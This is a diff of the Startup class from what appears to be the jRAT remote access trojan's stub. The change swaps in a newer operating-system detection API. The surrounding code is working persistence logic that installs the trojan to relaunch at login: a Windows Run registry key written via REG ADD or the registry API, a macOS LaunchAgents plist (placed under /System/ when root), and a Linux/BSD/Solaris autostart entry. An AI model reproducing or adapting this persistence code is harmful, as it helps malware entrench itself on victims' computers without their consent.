@@ -9,7 +9,8 @@ import se.jrat.stub.utils.Utils;
 import com.redpois0n.oslib.DesktopEnvironment;
 import com.redpois0n.oslib.DesktopEnvironment.Family;
 import com.redpois0n.oslib.OperatingSystem;
-import com.redpois0n.oslib.WindowsVersion;
+import com.redpois0n.oslib.windows.WindowsOperatingSystem;
+import com.redpois0n.oslib.windows.WindowsVersion;
 
 
 public class Startup {
@@ -19,14 +20,14 @@ public class Startup {
 
 		String home = System.getProperty("user.home");
 
-		if (Utils.isRoot() && OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
+		if (Utils.isRoot() && OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
 			home = "/System/";
 		}
 		if (currentJar.isFile() || currentJar.getName().endsWith(".jar")) {
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				String javaHome = System.getProperty("java.home") + "\\bin\\javaw.exe";
 
-				if (WindowsVersion.getFromString() == WindowsVersion.WINXP) {			
+				if (((WindowsOperatingSystem) OperatingSystem.getOperatingSystem()).getVersion() == WindowsVersion.WINXP) {			
 					String data = javaHome + " -jar \"" + currentJar.getAbsolutePath().replace("%20", " ") + "\"";
 					String cmd = "REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v \"" + name + "\" /t REG_SZ /d \"" + data + "\" /f";
 					Runtime.getRuntime().exec(cmd);
@@ -39,7 +40,7 @@ public class Startup {
 					WinRegistry.writeStringValue(WinRegistry.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, "\"" + javaHome + "\" -jar \"" + currentJar.getAbsolutePath() + "\"");
 				
 				}
-			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
+			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
 				File startupFile = new File(home + "/Library/LaunchAgents/" + Configuration.name + ".plist");
 
 				if (!startupFile.getParentFile().exists()) {
@@ -64,7 +65,7 @@ public class Startup {
 				out.println("</dict>");
 				out.println("</plist>");
 				out.close();
-			} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX || OperatingSystem.getOperatingSystem() == OperatingSystem.OPENBSD || OperatingSystem.getOperatingSystem() == OperatingSystem.FREEBSD || OperatingSystem.getOperatingSystem() == OperatingSystem.SOLARIS) {
+			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.LINUX || OperatingSystem.getOperatingSystem().getType() == OperatingSystem.BSD || OperatingSystem.getOperatingSystem().getType() == OperatingSystem.SOLARIS) {
 				File autostart = new File(home + "/.config/autostart/");
 
 				if (!autostart.exists()) {
